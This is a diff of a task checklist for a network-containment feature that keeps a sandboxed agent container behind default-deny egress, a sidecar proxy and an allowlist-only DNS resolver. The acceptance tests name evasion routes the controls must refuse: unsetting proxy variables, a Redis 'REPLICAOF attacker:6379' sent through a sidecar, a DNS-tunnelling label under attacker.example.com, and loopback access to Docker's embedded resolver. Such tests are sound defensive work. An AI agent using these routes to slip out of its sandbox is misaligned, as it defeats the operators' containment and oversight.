@@ -306,14 +306,14 @@ it must fail (quickstart S12).
 - [X] T119 [US4] Implement FR-021 — when transparent enforcement cannot be delivered on a host, fall back to Phase A's mechanism under `advisory` and refuse under `strict`, **naming which mode was obtained**. **Define the detection explicitly** (can the daemon grant `NET_ADMIN`? does `network_mode: service:` work on this runtime?) and prefer a positive probe over an assumption — an undetected failure silently downgrades to Phase A's strength while reporting the stronger one
 - [ ] T120 [US4] Place operator sidecars **inside** the boundary by default (FR-023), with an explicit opt-out (FR-023a)
 - [ ] T121 [US4] Name every out-of-boundary sidecar in the enforcement statement (FR-023b, **SC-015**) — otherwise `enforced: true` quietly means "except for these three containers", which is the overclaim SC-004 forbids wearing a different hat
-- [ ] T122 [US4] Extend `validate_sidecar_override` to check **egress posture**, not only shape (FR-023d) — it was cosmetic before this feature and is security-relevant after
+- [X] T122 [US4] Extend `validate_sidecar_override` to check **egress posture**, not only shape (FR-023d) — it was cosmetic before this feature and is security-relevant after
 - [ ] T123 [US4] Ensure no automatic project-network allowance is granted (FR-023c) — that would be the hidden baseline FR-001e forbids, reintroduced by the back door
 
 ### Evasion acceptance (US4) — the only tests that can establish the claim
 
-- [ ] T124 [US4] Acceptance: unset **every** proxy variable and reach an undeclared host — must fail (SC-008, quickstart S12). Under Phase A this **succeeds**; that difference is the feature
+- [X] T124 [US4] Acceptance: unset **every** proxy variable and reach an undeclared host — must fail (SC-008, quickstart S12). Under Phase A this **succeeds**; that difference is the feature
 - [ ] T125 [US4] Acceptance: write proxy overrides into `~/.agent-env/env`, open a new shell, retry — must still fail. This is the hole Phase A had to *disclose* under FR-008a
-- [ ] T126 [US4] Acceptance: assert the agent container's capability set is **identical** to an undeclared environment's (SC-011, quickstart S16)
+- [X] T126 [US4] Acceptance: assert the agent container's capability set is **identical** to an undeclared environment's (SC-011, quickstart S16)
 - [ ] T127a [US4] Acceptance: place a sidecar **outside** the boundary and assert it is **named** in the enforcement statement and in `--json` (SC-015). An unnamed exception is indistinguishable from a bug
 - [ ] T127 [US4] Acceptance: drive a real `redis REPLICAOF attacker:6379` through an operator sidecar — must be refused (SC-014, quickstart S17). The agent needn't escape the namespace; it need only ask something that already has the access
 
@@ -328,7 +328,7 @@ it must fail (quickstart S12).
 **Independent test**: declare one HTTPS provider; confirm SSH, FTP and an arbitrary high port all
 fail, then declare SSH to one host and confirm only that host on that port opens (quickstart S13/S14).
 
-- [ ] T128 [US5] Deliver FR-020a by **DROPPING** port 53 rather than redirecting it (research R18, measured): default-deny already makes every resolver except the sidecar's unreachable, so no DNS NAT rule is needed at all. Add the resolv.conf line to `image/entrypoint.sh` — that is the **usability** half, not the enforcement, and must not be described as enforcement. `dns:` on the agent service is **impossible**: the daemon rejects it against `network_mode: service:`
+- [ ] T128 [US5] **Two parts, both required (research R19)**: (a) point the agent's `/etc/resolv.conf` at the sidecar resolver in `image/entrypoint.sh`; (b) **narrow the loopback ACCEPT so it does not cover `127.0.0.11:53`** — Docker's embedded resolver sits there on every user-defined network, is reached over loopback, and forwards OUTSIDE the namespace. Without (b) the rewrite in (a) is advisory, which is the exact distinction US4 exists to make. Deliver FR-020a by **DROPPING** port 53 rather than redirecting it (research R18, measured): default-deny already makes every resolver except the sidecar's unreachable, so no DNS NAT rule is needed at all. Add the resolv.conf line to `image/entrypoint.sh` — that is the **usability** half, not the enforcement, and must not be described as enforcement. `dns:` on the agent service is **impossible**: the daemon rejects it against `network_mode: service:`
 - [ ] T129 [US5] Implement allowlist-only resolution (FR-020b) — declared names resolve, everything else does not
 - [ ] T130 [P] [US5] Record refused resolutions (FR-020d), for the same reason a refused connection is recorded
 - [ ] T131 [US5] Make a refusal distinguishable from a genuine "no such host" (FR-020e), per T103's finding
@@ -340,7 +340,7 @@ fail, then declare SSH to one host and confirm only that host on that port opens
 - [ ] T134 [US5] Acceptance: an undeclared **non-standard HTTP port** (8080) and an arbitrary port (1337) both fail (SC-009, quickstart S13). **The first design sketch got this wrong** — redirecting only 80/443 under default-accept lets 8080 through, which is worse than no control
 - [ ] T135 [US5] Acceptance: a declared `{host, port: 22}` is reachable at **that host and that port only** — not the protocol generally, not another host (SC-010, quickstart S14)
 - [ ] T136 [US5] Acceptance: an undeclared name does not resolve, **including a tunnelling-shaped label** like `ZXhmaWx0cmF0ZWQ.attacker.example.com` (SC-012, quickstart S15)
-- [ ] T136a [US5] Acceptance: a **declared** name still resolves and the environment works end to end (US5 scenario 3). **An allowlist-only resolver that resolves NOTHING passes every other DNS test here** — the positive case is what separates "working" from "broken closed", and broken-closed is the failure this mechanism makes easy
+- [X] T136a [US5] Acceptance: a **declared** name still resolves and the environment works end to end (US5 scenario 3). **An allowlist-only resolver that resolves NOTHING passes every other DNS test here** — the positive case is what separates "working" from "broken closed", and broken-closed is the failure this mechanism makes easy
 - [ ] T137 [US5] Acceptance: `dig @8.8.8.8` is forced to the sidecar resolver (SC-013, quickstart S15)
 - [ ] T137a [US5] Acceptance: on a host where transparent enforcement **cannot** be delivered, `advisory` deploys and names the fallback mechanism while `strict` refuses (US5 scenario 4, FR-007b). SC-004a asserted this for Phase A only; without it `enforced: true` is ambiguous between two mechanisms of very different strength
 - [ ] T138 [US5] Acceptance: `git push` over declared SSH **succeeds** (quickstart S18). If this fails the feature is unshippable, whatever else passes
